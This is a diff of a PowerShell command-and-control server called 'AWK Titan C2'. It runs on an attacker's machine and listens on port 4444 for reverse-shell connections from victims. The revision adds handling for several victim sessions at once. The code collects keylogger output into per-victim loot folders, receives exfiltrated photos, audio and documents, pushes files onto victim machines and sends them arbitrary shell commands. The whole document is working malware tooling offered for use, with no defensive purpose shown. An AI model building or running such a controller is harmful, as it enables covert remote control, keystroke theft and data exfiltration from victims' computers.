@@ -1,95 +1,120 @@
-# Execute the following script through Administrator Access of Powershell in Attacker's Device to start the listening on 4444 Custom Port.
+# Execute the following script through Administrator Access of PowerShell in the Attacker's Device to start listening on 4444 Custom Port.
+# Added Multi-Device connectivity and interacting options by interact [index] command.
 
 
 
 
-# --- [AWK] MASTER CONTROLLER v9.5 ---
+# --- [AWK] MULTI-TITAN MASTER ---
 $port = 4444
 $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)
-$lootDir = "$env:USERPROFILE\Desktop\AWK_Loot"
-$keyFile = Join-Path $lootDir "live_keys.txt"
+$listener.Start()
+$lootBase = "$env:USERPROFILE\Desktop\AWK_Loot"
+if (!(Test-Path $lootBase)) { New-Item -ItemType Directory -Path $lootBase | Out-Null }
 
-if (!(Test-Path $lootDir)) { New-Item -ItemType Directory -Path $lootDir | Out-Null }
+$Sessions = @{} 
+$SessionID = 0
 
-try {
-    $listener.Start()
-    Write-Host "[!] AWK TITAN C2 ONLINE - LISTENING..." -ForegroundColor Cyan
+Write-Host "[!] TITAN C2 ONLINE - WL&WJ" -ForegroundColor Cyan
+Write-Host "[*] Use 'list' to see victims and 'interact ID' to control." -ForegroundColor Gray
 
-    $client = $listener.AcceptTcpClient(); $stream = $client.GetStream()
-    $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
-    $reader = New-Object System.IO.StreamReader($stream)
-    
-    Write-Host "[+] Connection Established: $($client.Client.RemoteEndPoint.Address)" -ForegroundColor Green
-    Write-Host "[*] SILENT LOGGING: Keystrokes are saving to AWK_Loot\live_keys.txt`n" -ForegroundColor Gray
+while($true) {
+    # 1. NON-BLOCKING LISTENER FOR NEW VICTIMS
+    if ($listener.Pending()) {
+        $SessionID++; $client = $listener.AcceptTcpClient(); $stream = $client.GetStream()
+        $reader = New-Object System.IO.StreamReader($stream)
+        $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
+        
+        # Expecting client to send PC Name as the first line
+        $pcName = $reader.ReadLine()
+        
+        # Create dedicated folder for this victim
+        $vFolder = Join-Path $lootBase "Session_$SessionID"
+        if (!(Test-Path $vFolder)) { New-Item -ItemType Directory -Path $vFolder | Out-Null }
 
-    while($client.Connected) {
-        # 1. BACKGROUND DATA CLEANER (Handles silent keys while idling)
-        while ($stream.DataAvailable) {
-            $peek = $reader.ReadLine()
-            if ($peek -eq "---K---") {
-                $k = $reader.ReadLine(); $reader.ReadLine() | Out-Null
-                $k | Out-File $keyFile -Append -NoNewline
-            }
-        }
+        $Sessions[$SessionID] = @{ Client=$client; Reader=$reader; Writer=$writer; Name=$pcName; Folder=$vFolder }
+        Write-Host "`n[+] NEW SESSION: [$SessionID] ($pcName) connected from $($client.Client.RemoteEndPoint)" -ForegroundColor Green
+    }
 
-        # 2. COMMAND INPUT
-        $command = Read-Host "AWK-Shell"
-        if ([string]::IsNullOrWhiteSpace($command)) { continue }
+    # 2. MAIN C2 MENU
+    $input = Read-Host "AWK-C2"
+    if ($input -eq "list") {
+        Write-Host "`nID | Remote Address | Computer Name" -ForegroundColor Yellow
+        $Sessions.Keys | % { Write-Host "$_ | $($Sessions[$_].Client.RemoteEndPoint) | $($Sessions[$_].Name)" }
+    }
+    elseif ($input -like "interact *") {
+        $id = [int]$input.Split(" ")[1]
+        if ($Sessions.ContainsKey($id)) {
+            $s = $Sessions[$id]; Write-Host "[*] Interacting with $id ($($s.Name)). Type 'back' to return." -ForegroundColor Magenta
+            
+            while($s.Client.Connected) {
+                $cmd = Read-Host "AWK-Shell@$id"
+                if ($cmd -eq "back") { break }
+                
+                # --- PUSH LOGIC (INFILTRATION) ---
+                if ($cmd -like "push *") {
+                    $localPath = $cmd.Substring(5).Trim()
+                    if (Test-Path $localPath) {
+                        $fName = Split-Path $localPath -Leaf
+                        $s.Writer.WriteLine("silent_put")
+                        $s.Writer.WriteLine($fName)
+                        $s.Writer.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($localPath)))
+                        Write-Host "[*] Pushing $fName..." -ForegroundColor DarkCyan
+                    } else { Write-Host "[-] File not found." -ForegroundColor Red; continue }
+                } else { $s.Writer.WriteLine($cmd) }
+                $s.Writer.Flush()
 
-        # 3. PUSH HANDLER (INFILTRATION)
-        if ($command -like "push *") {
-            $localPath = $command.Substring(5).Trim()
-            if (Test-Path $localPath) {
-                $fileName = Split-Path $localPath -Leaf
-                $writer.WriteLine("silent_put")
-                $writer.WriteLine($fileName)
-                $writer.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($localPath)))
-                Write-Host "[*] Infiltrating $fileName..." -ForegroundColor DarkCyan
-            } else { Write-Host "[-] Local file not found." -ForegroundColor Red; continue }
-        } else {
-            $writer.WriteLine($command)
-            $writer.Flush()
-        }
+                # --- UNIVERSAL SYNC & EXTRACTION ENGINE ---
+                $isLooting = $false; $lootBuffer = ""; $currentFile = ""
+                while ($true) {
+                    $line = $s.Reader.ReadLine()
+                    if ($line -eq "PS_READY" -or $line -eq $null) { break }
+                    
+                    # A. HANDLE KEYLOGGER (Prevents corruption during file transfer)
+                    if ($line -eq "---K---") {
+                        $k = $s.Reader.ReadLine(); $s.Reader.ReadLine() | Out-Null
+                        if (!$isLooting) { 
+                            $k | Out-File (Join-Path $s.Folder "live_keys.txt") -Append -NoNewline 
+                        }
+                        continue
+                    }
 
-        if ($command -eq "exit" -or $command -eq "boom") { break }
+                    # B. DETECT START OF FILE (Snap, Listen, or Pull)
+                    if ($line -eq "---START_FILE---" -or $line -match "\.(jpg|wav|docx|txt|pdf|png)$") {
+                        # Resolve filename: If START_FILE is used, the next line is the name
+                        $currentFile = if ($line -eq "---START_FILE---") { $s.Reader.ReadLine() } else { $line }
+                        
+                        # Failsafe for empty filenames
+                        if ([string]::IsNullOrWhiteSpace($currentFile)) { $currentFile = "loot_$(Get-Date -f HHmmss).bin" }
+                        
+                        $isLooting = $true; $lootBuffer = ""
+                        Write-Host "[*] Receiving Binary Data: $currentFile" -ForegroundColor Cyan
+                        continue
+                    }
 
-        # 4. RESPONSE SYNCHRONIZER
-        $lootBuffer = ""; $isLooting = $false; $currentFile = ""
-        while ($true) {
-            $line = $reader.ReadLine()
-            if ($line -eq "PS_READY" -or $line -eq $null) { break }
+                    # C. DETECT END OF FILE & SAVE
+                    if ($line -eq "---END_FILE---" -or $line -eq "---E---" -or $line -eq "---END---") {
+                        $isLooting = $false
+                        if ($lootBuffer.Length -gt 0) {
+                            try {
+                                $savePath = Join-Path $s.Folder $currentFile
+                                [IO.File]::WriteAllBytes($savePath, [Convert]::FromBase64String($lootBuffer))
+                                Write-Host "[+] SUCCESS: File saved to Session_$id folder." -ForegroundColor Green
+                            } catch { Write-Host "[-] Failed to save file: $($_.Exception.Message)" -ForegroundColor Red }
+                        }
+                        $lootBuffer = ""; $currentFile = ""; continue
+                    }
 
-            # Handle Keys during command execution
-            if ($line -eq "---K---") {
-                $keys = $reader.ReadLine(); $reader.ReadLine() | Out-Null
-                $keys | Out-File $keyFile -Append -NoNewline
-                continue
-            }
-
-            # --- FILE EXTRACTION LOGIC (PULL/SNAP) ---
-            if ($line -eq "---START_FILE---") {
-                $currentFile = $reader.ReadLine()
-                $isLooting = $true
-                Write-Host "[*] Extracting: $currentFile..." -ForegroundColor Cyan
-                continue
-            }
-            if ($line -eq "---END_FILE---") {
-                $isLooting = $false
-                [IO.File]::WriteAllBytes((Join-Path $lootDir $currentFile), [Convert]::FromBase64String($lootBuffer))
-                Write-Host "[+] Successfully Saved to AWK_Loot." -ForegroundColor Green
-                $lootBuffer = ""; continue
-            }
-
-            if ($isLooting) { 
-                $lootBuffer += $line 
-            } else { 
-                # Standard Console Output (find, ls, whoami, cat)
-                Write-Host $line -ForegroundColor Gray 
-            }
-        }
-    }
-} catch { 
-    Write-Host "`n[-] Connection terminated." -ForegroundColor Red 
-} finally { 
-    $listener.Stop(); if($client){$client.Close()}
+                    # D. ACCUMULATE DATA OR PRINT OUTPUT
+                    if ($isLooting) { 
+                        if ($line -eq "---B---") { continue } # Ignore Snap start-marker
+                        $lootBuffer += $line 
+                    } else { 
+                        Write-Host $line -ForegroundColor Gray 
+                    }
+                }
+            }
+        }
+    }
+    elseif ($input -eq "exit") { break }
 }
+$listener.Stop()
